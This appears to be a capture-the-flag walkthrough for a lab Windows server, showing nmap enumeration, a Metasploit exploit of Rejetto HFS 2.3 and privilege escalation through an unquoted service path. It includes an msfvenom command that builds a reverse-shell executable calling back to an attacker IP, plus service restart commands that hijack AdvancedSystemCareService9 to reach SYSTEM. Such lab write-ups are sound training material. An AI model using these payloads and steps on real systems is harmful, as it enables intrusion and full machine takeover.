# Enumeration
Run nmap to check service running
```sh
nmap -sV 10.10.99.191
```

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl          Microsoft SChannel TLS
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
```

Run complete scan with -A and we can see port 8080 used by Rejetto HTTP File Server version 2.3.

# Exploitation
Now we can check for exploit for this version and use metasploit to exploit it.
![image](https://github.com/vivekprm/hackers-manual/assets/2403660/eef133f9-c4bd-44bb-8f55-dcf11b923e80)

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/27708756-81d9-466d-a727-c7f969634b5e)

And now we have meterpreter shell.

# Privilege Escalation
To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp 
aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

You can download the script [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).  If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can 
use the upload command in Metasploit to upload the script.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/0adebe48-4b06-470f-a964-5413d37e33d3)

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:
```sh
meterpreter>powershell_shell
```

Run all checks
![image](https://github.com/vivekprm/hackers-manual/assets/2403660/76138e83-faa1-43ce-bda1-6e6dcc25ccb1)

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace 
the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.17.19.58 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Now upload this payload to somewhere in this path "C:\Program Files (x86)\IObit\Advanced SystemCare\" which we have write access. Since path is not quoted we
can upload it at "C:\Program Files (x86)\IObit\" which is writeable for us.

Now before stoping and starting the AdvancedSystemCareService9 program let's run our handler.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/fb502137-dfb7-4700-bf00-905b0038ebd9)

Now go to shell from meterpreter:
```sh
meterpreter>shell
```

And restart the service using below commands:
```sh
sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```

And we have a shell with NT System.

